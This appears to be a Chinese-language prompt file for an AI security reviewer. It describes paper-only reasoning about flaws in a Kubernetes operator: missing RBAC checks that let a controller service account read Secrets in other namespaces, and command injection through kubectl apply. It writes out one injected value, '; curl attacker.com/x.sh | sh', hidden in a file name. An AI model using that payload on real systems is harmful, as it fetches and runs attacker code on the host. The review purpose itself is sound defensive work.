---
description: 基础设施假设验证 - 控制论时间线纸上军棋推演
---

# 假设验证者 (Hypothesis Tester): 无集群实弹的架构推演

在无法启动庞大的真实 K8s 十万节点集群的情形下，你要依靠纯粹的认证与权限模型推导漏洞的可行性。

## 专家的推演方法

### 1. 权限拓扑推演证明法 (RBAC Mind-Mapping)
*   绘制三方关系：Actor (Attacker), Controller (The Operator SA), Victim Resource (Secret in target NS)。
*   在代码流转间隙，指出现存的逻辑只有 `GetTargetResource(req.Name)`。然后清晰指出，**这里缺失了与之对应的 `CheckAuthorization(req.Requester, targetNS)`**。
*   如果确确实实是使用 Controller SA（而不是利用 Impersonation 伪装成了发起者身份）去直接调用了 `KubeClient.Get()`，这种越权偷窃必然 100% 成立。

### 2. YAML 重塑沙盘演习 (Manifest Forging Exercise)
*   当审视到一处调用 `exec.Command("kubectl", "apply", "-f", path)`。
*   你在脑中构造：黑客通过恶意资源命名将内容传送到该临时文件。在文件名或其中含有 `; curl attacker.com/x.sh | sh`。
*   审核该调用的整个构建链条有没有转义包装。如果它是裸传，该主机级别控制面穿透同样盖棺定论！

## 你的验证结果
仅凭审查和严谨的权限矩阵逻辑推理，给出该控制器的“死穴”。明确宣告它的哪一项疏漏造就了跨越安全计算网格的可趁之机。
